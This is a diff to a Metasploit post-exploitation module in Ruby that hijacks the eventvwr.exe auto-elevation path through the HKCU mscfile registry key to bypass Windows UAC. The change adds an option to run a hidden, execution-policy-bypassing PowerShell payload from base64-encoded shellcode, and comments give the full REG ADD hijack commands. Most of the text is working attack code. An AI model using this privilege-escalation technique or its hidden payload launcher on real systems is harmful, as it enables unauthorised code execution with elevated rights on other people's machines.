@@ -33,10 +33,17 @@
 #
 #
 # [ MODULE OPTIONS ]
-# The session number to run this module on    => set SESSION 3
-# The cmd.exe command to be executed (target) => set CMD_COMMAND start firefox.exe www.househot.com
-# Check target vulnerability settings/status? => set CHECK_VULN true
-# Delete malicious registry hive keys/values? => set DEL_REGKEY true
+# The session number to run this module on      => set SESSION 3
+# The cmd.exe command to be executed (target)   => set CMD_COMMAND start firefox.exe www.househot.com
+# Check target vulnerability settings/status?   => set CHECK_VULN true
+# Delete malicious registry hive keys/values?   => set DEL_REGKEY true
+# Exec powershell payload insted of a cmd comm? => set USE_POWERSHELL true
+# ---
+# HINT: To deploy a powershell payload we need to set USE_POWERSHELL true
+# and input the powershell base64 encoded shellcode into CMD_COMMAND
+# EXAMPLE: set USE_POWERSHELL true | set CMD_COMMAND aDfSjRnGlsWlDtBsQkGftmoEdD==
+# ---
+#
 #
 #
 # [ PORT MODULE TO METASPLOIT DATABASE ]
@@ -134,6 +141,7 @@ class MetasploitModule < Msf::Post
 
                 register_advanced_options(
                         [
+                                OptBool.new('USE_POWERSHELL', [ false, 'Execute an powershell payload insted of a cmd command?' , false]),
                                 OptBool.new('DEL_REGKEY', [ false, 'Delete malicious registry key hive?' , false])
                         ], self.class) 
 
@@ -149,11 +157,11 @@ def ls_stage1
 
   r=''
   session = client
-  vul_serve = "eventvwr.exe"                                   # vulnerable soft to be hijacked
-  exec_comm = datastore['CMD_COMMAND']                         # my cmd command to execute
-  comm_path = "%SystemRoot%\\System32\\cmd.exe /c"             # %comspec% path 
+  vul_serve = "eventvwr.exe" # vulnerable soft to be hijacked
+  exec_comm = datastore['CMD_COMMAND'] # my cmd command to execute
+  comm_path = "%SystemRoot%\\System32\\cmd.exe /c" # %comspec% path
+  psh_comma = "powershell.exe -nop -wind hidden -Exec Bypass -noni -enc" # use_powershell advanced option command
   regi_hive = "REG ADD HKCU\\Software\\Classes\\mscfile\\shell\\open\\command" # registry hive key to be hijacked
-  comm_inje = "#{regi_hive} /ve /t REG_SZ /d \"#{comm_path} #{exec_comm}\" /f" # injection registry oneliner command
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options...
   if datastore['CMD_COMMAND'] == 'nil'
@@ -181,7 +189,18 @@ def ls_stage1
        return nil
     end
 
+    #
+    # chose to execute a single command in cmd.exe syntax
+    # or to execute a encoded (base64) payload powershell deploy 
+    #
+    if datastore['USE_POWERSHELL'] == true
+      comm_inje = "#{regi_hive} /ve /t REG_SZ /d \"#{psh_comma} #{exec_comm}\" /f"
+    else
+      comm_inje = "#{regi_hive} /ve /t REG_SZ /d \"#{comm_path} #{exec_comm}\" /f"
+    end
+
  # Execute process hijacking in registry...
+ # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /t REG_SZ /d "powershell.exe -nop -enc aDfSjRnGlsgVkGftmoEdD==" /f
  # REG ADD HKCU\Software\Classes\mscfile\shell\open\command /ve /t REG_SZ /d "c:\windows\System32\cmd.exe /c start notepad.exe" /f
  print_good(" Hijacking proccess to gain code execution...")
  r = session.sys.process.execute("cmd.exe /c #{comm_inje}", nil, {'Hidden' => true, 'Channelized' => true})
